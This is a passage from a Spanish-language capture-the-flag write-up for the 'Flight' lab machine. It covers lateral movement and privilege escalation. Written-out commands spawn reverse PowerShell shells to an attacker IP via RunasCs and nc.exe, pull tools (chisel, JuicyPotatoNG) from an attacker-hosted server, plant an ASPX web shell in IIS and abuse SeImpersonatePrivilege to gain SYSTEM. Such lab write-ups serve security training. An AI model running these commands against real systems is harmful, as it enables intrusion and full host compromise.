RunasCs.cs(1306,19): warning CS0649: Field 'AccessToken.TOKEN_PRIVILEGES.PrivilegeCount' is never assigned to, and will always have its default value 0
RunasCs.cs(1308,38): warning CS0649: Field 'AccessToken.TOKEN_PRIVILEGES.Privileges' is never assigned to, and will always have its default value null
RunasCs.cs(1332,23): warning CS0649: Field 'AccessToken.TOKEN_ELEVATION.TokenIsElevated' is never assigned to, and will always have its default value 0

C:\Users\svc_apache\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\Users\svc_apache\Desktop

04/18/2023  09:26 PM    <DIR>          .
04/18/2023  09:26 PM    <DIR>          ..
04/18/2023  09:23 PM            80,738 RunasCs.cs
04/18/2023  09:26 PM            48,640 RunasCs.exe
               2 File(s)        129,378 bytes
               2 Dir(s)   5,031,772,160 bytes free
```

Una vez compilada, ejecutamos el siguiente comando para generar un proceso que ejecute una PowerShell remota hacia nuestra máquina atacante en el puerto 444.

```bash
C:\Users\svc_apache\Desktop>RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.6:444
RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.6:444
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5b1d1$\Default
[+] Async process 'powershell' with pid 1260 created and left in background.

C:\Users\svc_apache\Desktop>
```

Para recibir la conexión, primero debemos establecer nuestro listener en el puerto correspondiente.

```bash
❯ nc -nlvp 444
listening on [any] 444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.187] 50208
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
flight\c.bum
```

Una vez como usuario `c.bum`, ya podemos leer la primera flag en el escritorio del usuario.

```bash
PS C:\Users\C.Bum\Desktop> type user.txt
type user.txt
0a57169b198f0be2****************
```

Al listar todas las conexiones TCP activas y los puertos TCP y UDP en los que escucha el equipo, podemos identificar que el puerto `8000` está en escucha. Este puerto suele ser usado para un servidor web HTTP alternativo. Lo extraño es que este puerto no aparecía en el escaneo de nmap, lo que sugiere que posiblemente se esté ejecutando localmente en la máquina.

```bash
PS C:\Users\C.Bum\Desktop> netstat -a
netstat -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             g0:0                   LISTENING
  TCP    0.0.0.0:88             g0:0                   LISTENING
  TCP    0.0.0.0:135            g0:0                   LISTENING
  TCP    0.0.0.0:389            g0:0                   LISTENING
  TCP    0.0.0.0:443            g0:0                   LISTENING
  TCP    0.0.0.0:445            g0:0                   LISTENING
  TCP    0.0.0.0:464            g0:0                   LISTENING
  TCP    0.0.0.0:593            g0:0                   LISTENING
  TCP    0.0.0.0:636            g0:0                   LISTENING
  TCP    0.0.0.0:3268           g0:0                   LISTENING
  TCP    0.0.0.0:3269           g0:0                   LISTENING
  TCP    0.0.0.0:5985           g0:0                   LISTENING
  TCP    0.0.0.0:8000           g0:0                   LISTENING
  TCP    0.0.0.0:9389           g0:0                   LISTENING
  TCP    0.0.0.0:10247          g0:0                   LISTENING
  TCP    0.0.0.0:47001          g0:0                   LISTENING
  TCP    0.0.0.0:49664          g0:0                   LISTENING
  TCP    0.0.0.0:49665          g0:0                   LISTENING
  TCP    0.0.0.0:49666          g0:0                   LISTENING
  TCP    0.0.0.0:49667          g0:0                   LISTENING
  TCP    0.0.0.0:49673          g0:0                   LISTENING
  TCP    0.0.0.0:49674          g0:0                   LISTENING
  TCP    0.0.0.0:49682          g0:0                   LISTENING
  TCP    0.0.0.0:49694          g0:0                   LISTENING
  TCP    0.0.0.0:49723          g0:0                   LISTENING
  TCP    10.10.11.187:53        g0:0                   LISTENING
```

### Remote port forwarding

Para inspeccionar el tráfico que fluye a través de este puerto, podemos utilizar un Remote port forwarding hacia nuestra máquina de ataque. Para ello, utilizaremos la herramienta `Chisel`. En primer lugar, compartiremos el ejecutable para Windows creando un servidor HTTP en Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Descargamos la herramienta en la máquina víctima.

```bash
PS C:\Users\C.Bum\Desktop> curl http://10.10.14.6/chisel.exe -o chisel.exe
curl http://10.10.14.6/chisel.exe -o chisel.exe
PS C:\Users\C.Bum\Desktop> dir
dir

    Directory: C:\Users\C.Bum\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/18/2023  11:42 PM        8230912 chisel.exe
-ar---        4/18/2023  11:26 PM             34 user.txt
```

En este caso, nuestra máquina atacante actuará como servidor para recibir la conexión. Para ello, debemos utilizar el siguiente comando y especificar el puerto del servidor:

```bash
❯ ./chisel_1.7.7_linux_amd64 server -p 9999 -reverse
2023/04/18 17:38:24 server: Reverse tunnelling enabled
2023/04/18 17:38:24 server: Fingerprint wq+IoivPZYHPs+td0xyMknuMz9J3t042og8Znskfol8=
2023/04/18 17:38:24 server: Listening on http://0.0.0.0:9999
```

Por otro lado, la máquina víctima actuará como cliente. Para ello, debemos ejecutar el siguiente comando, especificando el puerto del servidor y redirigiendo el tráfico del puerto 8000 al puerto 8000 de la máquina atacante.

```bash
PS C:\Users\C.Bum\Documents> .\chisel.exe client 10.10.14.6:9999 R:8000:127.0.0.1:8000
.\chisel.exe client 10.10.14.6:9999 R:8000:127.0.0.1:8000
2023/04/18 22:39:00 client: Connecting to ws://10.10.14.6:9999
2023/04/18 22:39:01 client: Connected (Latency 130.7676ms)
```

Ahora, si accedemos a la dirección `127.0.0.1:8000` de la máquina atacante, podremos acceder a la siguiente página web.

![web3](web3.png)

Usamos la herramienta `WhatWeb` para identificar las tecnologías que utiliza el servicio web.

```bash
❯ whatweb http://127.0.0.1:8000/
http://127.0.0.1:8000/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[127.0.0.1], JQuery[1.10.2,1.11.2], Microsoft-IIS[10.0], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript], Title[Flight - Travel and Tour], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge], YouTube
```

El resultado de `WhatWeb` nos informa que el servidor utilizado es un **Microsoft Internet Information Services (IIS)**. 

Como sabemos, el directorio `inetpub` de Windows se utiliza para los servicios de Microsoft Internet Information Services (IIS). Por lo tanto, accedemos a él para identificar su contenido.

```bash
PS C:\inetpub> cd development
cd development
PS C:\inetpub\development> dir
dir

    Directory: C:\inetpub\development

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/18/2023  11:42 PM                css                                                                   
d-----        4/18/2023  11:42 PM                fonts                                                                 
d-----        4/18/2023  11:42 PM                img                                                                   
d-----        4/18/2023  11:42 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html
```

Podemos observar que en `C:\inetpub\development` encontramos los recursos de la página web. Por lo tanto, podemos subir una web shell para establecer nuevamente una reverse shell. Es importante mencionar que, como estamos ante un IIS, debemos usar una extensión compatible como .`aspx`. En este caso usaremos la siguiente: [https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx](https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx)

Compartimos la Web Shell con extensión `.aspx` a la máquina víctima como de costumbre.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
PS C:\inetpub\development> curl http://10.10.14.6/webshell.aspx -o webshell.aspx
curl http://10.10.14.6/webshell.aspx -o webshell.aspx
PS C:\inetpub\development> dir
dir

    Directory: C:\inetpub\development

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/18/2023  11:57 PM                css                                                                   
d-----        4/18/2023  11:57 PM                fonts                                                                 
d-----        4/18/2023  11:57 PM                img                                                                   
d-----        4/18/2023  11:57 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html                                                            
-a----        4/18/2023  11:59 PM           5110 webshell.aspx
```

Luego, establecemos nuestra reverse shell utilizando el ejecutable nc.exe que subimos anteriormente.

![webshell](webshell.png)

Nos ponemos a la escucha en el puerto correspondiente para recibir la conexión.

```bash
❯ nc -nlvp 4488
listening on [any] 4488 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.187] 49879
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\nc> whoami
whoami
iis apppool\defaultapppool
```

## Escalación de privilegios

---

Una vez que nos encontramos como usuario `defaultapppool`, debemos buscar alguna forma de convertirnos en usuario `SYSTEM`. Para ello, comenzamos por listar los permisos asignados al usuario actual.

```bash
PS C:\nc> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Abuso de SeImpersonatePrivilege

Como podemos observar, el privilegio `SeImpersonatePrivilege` está activado. Según el artículo [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens), podemos explotarlo con varias herramientas. En este caso, haremos uso de [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)**.**

Procedemos a compartir la herramienta `JuicyPotato` en la máquina víctima, siguiendo los procedimientos habituales.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
PS C:\nc> curl http://10.10.14.6/JuicyPotatoNG.exe -o JuicyPotatoNG.exe
curl http://10.10.14.6/JuicyPotatoNG.exe -o JuicyPotatoNG.exe
PS C:\nc> dir
dir

    Directory: C:\nc

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/19/2023  12:13 AM                Microsoft                                                             
-a----        4/19/2023  12:25 AM         153600 JuicyPotatoNG.exe                                                     
-a----        4/19/2023  12:11 AM          59392 nc.exe
```

Una vez compartida la herramienta `JuicyPotato` en la máquina víctima, ejecutamos el siguiente comando para obtener una shell inversa y ejecutar PowerShell como usuario system.

```bash
PS C:\nc> .\JuicyPotatoNG.exe -t * -p "C:\nc\nc.exe" -a "10.10.14.6 9001 -e powershell"
.\JuicyPotatoNG.exe -t * -p "C:\nc\nc.exe" -a "10.10.14.6 9001 -e powershell"
```

Nos ponemos en escucha en el puerto correspondiente para recibir la conexión de la shell inversa.

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.187] 49948
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
whoami
nt authority\system
```

Finalmente como usuario `system` ya podemos acceder a la flag root ubicada en el escritorio.

```bash
PS C:\Users\Administrator\Desktop> dir
dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        4/18/2023  11:26 PM             34 root.txt                                                              

PS C:\Users\Administrator\Desktop> type root.txt
type root.txt
a587e6c4c722a758****************
```

¡Happy Hacking!
